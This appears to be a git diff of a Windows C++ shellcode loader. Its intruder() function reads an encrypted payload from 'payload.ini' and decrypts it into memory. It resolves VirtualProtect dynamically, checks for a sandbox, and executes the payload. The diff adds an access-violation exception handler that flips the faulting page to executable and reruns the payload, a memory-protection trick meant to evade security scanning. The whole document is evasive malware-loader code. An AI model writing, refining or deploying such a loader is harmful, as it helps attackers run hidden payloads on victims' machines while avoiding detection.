@@ -157,7 +157,23 @@ namespace getImportAddress {
 
 }
 
+namespace ExceptionHandle {
+    void ExceptionHandler(EXCEPTION_POINTERS* pException) {
+        if (pException->ExceptionRecord->ExceptionCode == EXCEPTION_ACCESS_VIOLATION) {
+            LPVOID faultingAddress = (LPVOID)pException->ExceptionRecord->ExceptionInformation[1]; // 访问的地址
+            DWORD oldProtect;
+
+            if (getImportAddress::getVirtualProtect()(faultingAddress, 4096, PAGE_EXECUTE, &oldProtect)) {
+                std::cout << "页面权限已修改为可执行！" << std::endl;
+            }
+        }
+    }
+}
+
 int intruder() {
+    char path[MAX_PATH];
+    GetCurrentDirectory(MAX_PATH, (LPWSTR)path);
+    std::cout << "当前工作目录: " << path << std::endl;
     string filename = "payload.ini";
     vector<unsigned char> key, encryptedData;
     if (!readFile(filename, key, encryptedData)) {
@@ -179,10 +195,16 @@ int intruder() {
     (getImportAddress::getVirtualProtect()(b, decryptedData.size(), PAGE_NOACCESS, &oldProtect));
     Sleep(5);
   
-    (getImportAddress::getVirtualProtect()(b, decryptedData.size(), PAGE_EXECUTE_READ, &oldProtect));
+    //(getImportAddress::getVirtualProtect()(b, decryptedData.size(), PAGE_EXECUTE_READ, &oldProtect));
     detect_sandbox();
-    b();
-    
+    __try {
+        b();
+    }
+    __except (ExceptionHandle::ExceptionHandler(GetExceptionInformation()), EXCEPTION_EXECUTE_HANDLER) {
+        std::cout << "已将页面设置为可执行！" << std::endl;
+        b();
+    }
+    (getImportAddress::getVirtualProtect()(b, decryptedData.size(), PAGE_NOACCESS, &oldProtect));
     return 0;
 }
 
